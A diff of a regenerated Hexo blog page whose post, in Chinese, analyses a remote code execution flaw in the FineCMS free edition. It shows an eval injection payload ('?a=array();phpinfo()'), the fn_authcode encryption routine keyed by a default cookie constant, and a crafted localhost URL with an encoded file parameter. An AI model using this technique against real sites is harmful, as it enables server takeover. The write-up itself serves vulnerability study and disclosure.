@@ -15,10 +15,10 @@
 
 
 <html class="theme-next pisces use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 
 
@@ -32,8 +32,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -56,9 +56,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
@@ -129,10 +129,12 @@
 
 
 
+  <link rel="alternate" href="/atom.xml" title="Noel's Blog" type="application/atom+xml">
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/03/finecms免费版漏洞分析/"/>
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/03/finecms免费版漏洞分析/">
 
 
 
@@ -228,7 +230,7 @@
           
           <li class="menu-item menu-item-home">
     <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
   </li>
         
         
@@ -236,7 +238,7 @@
           
           <li class="menu-item menu-item-tags">
     <a href="/tags/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
   </li>
         
         
@@ -244,7 +246,7 @@
           
           <li class="menu-item menu-item-categories">
     <a href="/categories/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
   </li>
         
         
@@ -252,7 +254,7 @@
           
           <li class="menu-item menu-item-archives">
     <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
   </li>
 
       
@@ -368,7 +370,7 @@
           </span>
 
           
-            <span class="post-category" >
+            <span class="post-category">
             
               <span class="post-meta-divider">|</span>
             
@@ -396,11 +398,10 @@
 
           
             <span class="post-meta-divider">|</span>
-            <span class="post-meta-item-icon"
-            >
+            <span class="post-meta-item-icon">
             <i class="fa fa-eye"></i>
              阅读次数： 
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
             </span>
           
 
@@ -425,21 +426,21 @@
 <a id="more"></a>
 <h2 id="0x00-开始前的准备"><a href="#0x00-开始前的准备" class="headerlink" title="0x00 开始前的准备"></a>0x00 开始前的准备</h2><p>网上存在许多5.0.X的漏洞分析，本来想找个5.0.x版本的进行分析，结果最后只找到了一个免费版</p>
 <h2 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h2><p>在\extensions\下的function.php文件下有一个函数</p>
-<p><img src="/2018/10/03/finecms免费版漏洞分析/00.png" alt=""></p>
+<p><img src="/2018/10/03/finecms免费版漏洞分析/00.png" alt></p>
 <p>其中的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="string">"\$array = $data;"</span>);</span><br></pre></td></tr></table></figure>
 <p>很明显存在漏洞，先测试下</p>
-<p><img src="/2018/10/03/finecms免费版漏洞分析/01.png" alt=""></p>
+<p><img src="/2018/10/03/finecms免费版漏洞分析/01.png" alt></p>
 <p>Payload:?a=array();phpinfo()</p>
-<p><img src="/2018/10/03/finecms免费版漏洞分析/02.png" alt=""></p>
+<p><img src="/2018/10/03/finecms免费版漏洞分析/02.png" alt></p>
 <h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>回到CMS中，找一下哪里用了这个函数，在function.php文件里发现了一个fn_authcode函数</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * authcode函数(用于数组)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn_authcode</span><span class="params">($data, $operation = <span class="string">'DECODE'</span>, $key = <span class="string">''</span>, $expiry = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	$ckey_length = <span class="number">4</span>;</span><br><span class="line">	$string	= $operation == <span class="string">'DECODE'</span> ? $data : array2string($data);</span><br><span class="line">	$key	= md5($key ? $key : SITE_MEMBER_COOKIE);</span><br><span class="line">	$keya	= md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">	$keyb	= md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">	$keyc	= $ckey_length ? ($operation == <span class="string">'DECODE'</span> ? substr($string, <span class="number">0</span>, $ckey_length): substr(md5(microtime()), -$ckey_length)) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">	$cryptkey	= $keya . md5($keya . $keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">	$string	= $operation == <span class="string">'DECODE'</span> ? base64_decode(substr($string, $ckey_length)) : sprintf(<span class="string">'%010d'</span>, $expiry ? $expiry + time() : <span class="number">0</span>) . substr(md5($string . $keyb), <span class="number">0</span>, <span class="number">16</span>) . $string;</span><br><span class="line">	$string_length	= strlen($string);</span><br><span class="line"></span><br><span class="line">	$result = <span class="string">''</span>;</span><br><span class="line">	$box	= range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">	$rndkey = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i	= <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($operation == <span class="string">'DECODE'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> string2array(substr($result, <span class="number">26</span>));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $keyc . str_replace(<span class="string">'='</span>, <span class="string">''</span>, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>发现这个函数在ApiController.php文件中被调用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = fn_authcode(base64_decode(<span class="keyword">$this</span>-&gt;get(<span class="string">'file'</span>)), <span class="string">'DECODE'</span>);</span><br></pre></td></tr></table></figure>
-<p>这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload<img src="/2018/10/03/finecms免费版漏洞分析/03.png" alt=""></p>
+<p>这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload<img src="/2018/10/03/finecms免费版漏洞分析/03.png" alt></p>
 <p>尝试下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/finecms/?c=api&amp;a=down&amp;file=ZmZlMXhvY3N4ZWluZnpuSEoyUGRBRkhPZ01rcGRQbFdLZ1RJT3pSaG0rR21ab1JyRS96c1dnMnFJT1dTMUVn</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/03/finecms免费版漏洞分析/07.png" alt=""></p>
+<p><img src="/2018/10/03/finecms免费版漏洞分析/07.png" alt></p>
 <h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这一次漏洞分析还是异常吃力，漏洞函数很容易就发现了，但是漏洞利用的地方找了半天，除此之外就是fn_authocode函数的加解密，长见识了，对网站的整体结构了解还是不够，继续努力。</p>
 
       
@@ -476,8 +477,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/02/Vulnhub-FristiLeaks/" rel="next" title="Vulnhub FristiLeaks">
-                <i class="fa fa-chevron-left"></i> Vulnhub FristiLeaks
+              <a href="/2018/10/02/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
               </a>
             
           </div>
@@ -558,7 +559,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-count">40</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -597,7 +598,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -640,7 +645,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">15</span>
+                      
+                    
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -648,6 +655,13 @@
             </nav>
           
 
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
           
 
           
@@ -719,7 +733,7 @@
     <footer id="footer" class="footer">
       <div class="footer-inner">
         <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
@@ -735,7 +749,7 @@
 
   <div class="powered-by"><!--
 <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>-->
-  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.8.0</div>
 
 
 
@@ -747,7 +761,7 @@
 
 
 
-
+</div>
         
 <div class="busuanzi-count">
   <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
@@ -916,5 +930,5 @@
 
   
 
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
